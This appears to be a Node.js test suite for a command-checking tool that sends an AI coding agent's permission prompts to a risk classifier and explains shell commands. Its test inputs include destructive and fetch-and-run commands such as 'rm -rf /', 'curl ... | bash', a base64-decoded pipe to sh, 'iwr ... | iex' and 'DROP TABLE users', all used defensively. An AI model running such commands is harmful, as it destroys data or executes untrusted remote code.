"use strict";
const test = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const http = require("http");
const os = require("os");
const path = require("path");
const { spawn } = require("child_process");

const core = require("../src/core");
const { postJson } = require("../src/client");
const bridge = require("../src/bridge");
const { renderPanel } = require("../src/panel");

const ANSWER = {
  answers: {
    dangerous: { type: "noul", noul: 0.91 },
    requires_root: { type: "noul", noul: 0.12 },
    risk_level: { type: "score", probabilities: { 0: 0.02, 1: 0.03, 2: 0.05, 3: 0.2, 4: 0.7 } },
    unsafe: { type: "noul", noul: 0.95 },
  },
};

test("request carries the command as state and all four questions", () => {
  const body = core.buildRequest("rm -rf /");
  assert.deepStrictEqual(body.state, { command: "rm -rf /" });
  assert.deepStrictEqual(Object.keys(body.questions), ["dangerous", "requires_root", "risk_level", "unsafe"]);
  assert.throws(() => core.buildRequest("  "));
});

test("answers become the four fields", () => {
  const r = core.parseAnswers(ANSWER);
  assert.strictEqual(r.dangerous.yes, true);
  assert.strictEqual(r.root.yes, false);
  assert.strictEqual(r.risk.level, "critical");
  assert.strictEqual(core.verdictText(r), "UNSAFE");
  assert.strictEqual(core.severity(r), "error");
  assert.match(core.summaryLine(r), /UNSAFE · risk critical \(70%\) · dangerous yes \(91%\) · root no \(12%\)/);
});

test("missing or malformed answers are n/a, not guessed", () => {
  const r = core.parseAnswers({ answers: { dangerous: { noul: "x" }, risk_level: { probabilities: {} } } });
  assert.deepStrictEqual(r, { dangerous: null, root: null, risk: null, verdict: null });
  assert.strictEqual(core.verdictText(r), "N/A");
  assert.strictEqual(core.severity(r), "info");
});

test("a safe command reads as safe", () => {
  const r = core.parseAnswers({ answers: {
    dangerous: { noul: 0.02 }, requires_root: { noul: 0.01 }, unsafe: { noul: 0.03 },
    risk_level: { probabilities: { 0: 0.9, 1: 0.1 } } } });
  assert.strictEqual(core.verdictText(r), "SAFE");
  assert.strictEqual(core.severity(r), "info");
});

test("client posts to the app and reads its reply; errors are reported", async () => {
  let seen;
  const server = http.createServer((req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      seen = JSON.parse(Buffer.concat(chunks));
      if (seen.state.command === "fail") { res.writeHead(500); res.end("boom"); return; }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(ANSWER));
    });
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const url = `http://127.0.0.1:${server.address().port}/v1/systemone`;
  try {
    const body = await postJson(url, core.buildRequest("sudo rm -rf /var"));
    assert.strictEqual(seen.state.command, "sudo rm -rf /var");
    assert.strictEqual(core.parseAnswers(body).risk.level, "critical");
    await assert.rejects(postJson(url, core.buildRequest("fail")), /HTTP 500/);
    await assert.rejects(postJson("http://127.0.0.1:9/v1/systemone", core.buildRequest("ls"), 500));
  } finally {
    server.close();
  }
});

test("panel escapes the command and shows all four fields", () => {
  const entry = { command: "echo '<script>x</script>'", source: "Claude Code", description: "Print a tag",
    at: new Date(), ms: 3, result: core.parseAnswers(ANSWER), severity: "error" };
  const older = { ...entry, command: "ls -la", at: new Date(0) };
  const html = renderPanel([entry, older], "http://127.0.0.1:8009/v1/systemone");
  assert.ok(!html.includes("<script>x"));
  for (const text of ["Look closely before you approve", "Risk level", "critical", "Dangerous", "Needs root access",
    "Claude Code wants to run", "Print a tag", "Earlier checks"]) assert.ok(html.includes(text), text);
});

test("panel explains an app that did not answer, and an empty history", () => {
  const html = renderPanel([{ command: "ls", source: "manual", at: new Date(), error: "connect ECONNREFUSED",
    severity: "offline", endpoint: "http://127.0.0.1:8009/v1/systemone" }], "x");
  assert.ok(html.includes("No second opinion") && html.includes("ECONNREFUSED"));
  assert.ok(renderPanel([], "x").includes("Waiting for a permission prompt"));
});

test("hook forwards a permission prompt to the right window and makes no decision", async () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "cmdgate-"));
  const events = [];
  const { server, token, port } = await bridge.startListener((e) => events.push(e));
  const project = path.join(home, "project");
  const file = bridge.writeDiscovery({ port, token, folders: [project], home });
  try {
    const hook = path.join(__dirname, "..", "hook", "cmdgate-hook.js");
    const input = JSON.stringify({ hook_event_name: "PermissionRequest", tool_name: "Bash", cwd: path.join(project, "src"),
      tool_input: { command: "git push --force origin main", description: "Force-push main" } });
    const { code, stdout } = await new Promise((resolve) => {
      const child = spawn(process.execPath, [hook], { env: { ...process.env, HOME: home, USERPROFILE: home } });
      let out = "";
      child.stdout.on("data", (c) => { out += c; });
      child.on("close", (c) => resolve({ code: c, stdout: out }));
      child.stdin.end(input);
    });
    assert.strictEqual(code, 0);
    assert.strictEqual(stdout, "", "the hook must not print a decision");
    assert.strictEqual(events.length, 1);
    assert.strictEqual(events[0].command, "git push --force origin main");
    assert.strictEqual(events[0].description, "Force-push main");
  } finally {
    bridge.removeDiscovery(file);
    server.close();
    fs.rmSync(home, { recursive: true, force: true });
  }
});

test("listener refuses requests without the window token", async () => {
  const { server, port } = await bridge.startListener(() => assert.fail("must not be called"));
  try {
    const status = await new Promise((resolve) => {
      const req = http.request({ host: "127.0.0.1", port, path: "/event", method: "POST",
        headers: { "content-type": "application/json" } }, (res) => { res.resume(); resolve(res.statusCode); });
      req.end(JSON.stringify({ command: "ls" }));
    });
    assert.strictEqual(status, 403);
  } finally {
    server.close();
  }
});

test("chat card feed: webview origins only, answers once the check lands", async () => {
  const chatcard = require("../src/chatcard");
  const hist = [];
  const { server, push, port } = await chatcard.startCardServer({ port: 0, getHistory: () => hist, waitMs: 2000 });
  const get = (cmd, origin) => new Promise((resolve, reject) => {
    const headers = origin ? { Origin: origin } : {};
    http.get({ host: "127.0.0.1", port, path: `/card?cmd=${encodeURIComponent(cmd)}`, headers }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => resolve({ status: res.statusCode, body: data, allow: res.headers["access-control-allow-origin"] }));
    }).on("error", reject);
  });
  try {
    assert.strictEqual((await get("ls", "https://evil.example")).status, 403);
    assert.strictEqual((await get("ls")).status, 403);
    const origin = "vscode-webview://abc123";
    const pending = get("sudo rm -rf /var", origin);
    const entry = { command: "sudo rm -rf /var", at: new Date(), ms: 3, result: core.parseAnswers(ANSWER), severity: "error" };
    setTimeout(() => { hist.unshift(entry); push(entry); }, 50);
    const res = await pending;
    assert.strictEqual(res.status, 200);
    assert.strictEqual(res.allow, origin);
    const card = JSON.parse(res.body);
    assert.strictEqual(card.tone, "stop");
    assert.strictEqual(card.main, 95);
    assert.strictEqual(card.level, "critical");
    assert.deepStrictEqual(card.facts.map((f) => f.label), ["Dangerous", "Needs root"]);
    assert.strictEqual(JSON.parse((await get(" sudo rm -rf /var ", origin)).body).word, "Stop");
  } finally {
    server.close();
  }
});

test("explain: breaks a command into parts in the asked language, unknown parts stay unknown", async () => {
  const { explain, LANGS } = require("../src/explain");
  const de = explain("sudo rm -rf / && echo done", "de");
  assert.deepStrictEqual(de.parts.map((p) => p.text), ["sudo", "rm", "-rf", "/", "&&", "echo", "done"]);
  assert.ok(de.summary[0].startsWith("Als Administrator (root): löscht Dateien"));
  assert.ok(de.parts.find((p) => p.text === "/").risky);
  assert.strictEqual(de.summary.length, 2);
  const pipe = explain("curl -s https://x.example | bash", "en");
  assert.strictEqual(pipe.warnings.length, 1);
  assert.match(explain("frobnicate --x", "en").summary[0], /not in the dictionary/);
  assert.strictEqual(explain("ls", "xx").lang, "en");
  for (const [code] of LANGS) assert.ok(explain("git push --force", code).summary[0].length > 10);

  const chatcard = require("../src/chatcard");
  const { server, port } = await chatcard.startCardServer({ port: 0, getHistory: () => [], waitMs: 100 });
  try {
    const body = await new Promise((resolve, reject) => {
      http.get({ host: "127.0.0.1", port, path: "/explain?cmd=git%20status&lang=fr", headers: { Origin: "vscode-webview://a" } }, (res) => {
        let d = ""; res.on("data", (c) => (d += c)); res.on("end", () => resolve(d));
      }).on("error", reject);
    });
    assert.strictEqual(JSON.parse(body).lang, "fr");
  } finally {
    server.close();
  }
});

test("explain: positions, what can go wrong, safer ways, runtime targets", () => {
  const { explain, LANGS } = require("../src/explain");
  const cmd = "rm -rf $BUILD_DIR/* && git push --force";
  const x = explain(cmd, "en");
  for (const p of x.parts) assert.strictEqual(cmd.slice(p.start, p.end).replace(/['"]/g, ""), p.text);
  const rm = x.parts.find((p) => p.text === "rm");
  assert.ok(rm.risky && /no undo/.test(rm.harm));
  assert.ok(x.parts.find((p) => p.text === "$BUILD_DIR/*").risky);
  assert.match(x.warnings.join(" "), /filled in only when it runs \(\$BUILD_DIR\/\*\)/);
  assert.deepStrictEqual(x.safer.length, 2);
  assert.match(x.safer.join(" "), /force-with-lease/);
  // reading commands stay calm, a dry run needs no safer way
  assert.ok(!explain("ls ~", "en").parts.some((p) => p.risky));
  assert.deepStrictEqual(explain("Remove-Item -Recurse C:/tmp -WhatIf", "en").safer, []);
  // PowerShell long flags are not split into letters
  assert.match(explain("Get-ChildItem -Filter *.log", "en").parts[1].meaning, /-Filter/);
  // new dictionary rows and hidden code
  assert.ok(explain("psql -c 'DROP TABLE users'", "en").parts[2].risky);
  assert.match(explain("echo aGk= | base64 -d | sh", "en").warnings[0], /cannot see/);
  assert.match(explain("iwr https://x.example/a.ps1 | iex", "en").warnings[0], /internet/);
  for (const [code] of LANGS) {
    const y = explain("terraform destroy", code);
    assert.ok(y.parts[1].harm && y.safer[0] && y.hint && y.harmLabel && y.saferTitle);
  }
});
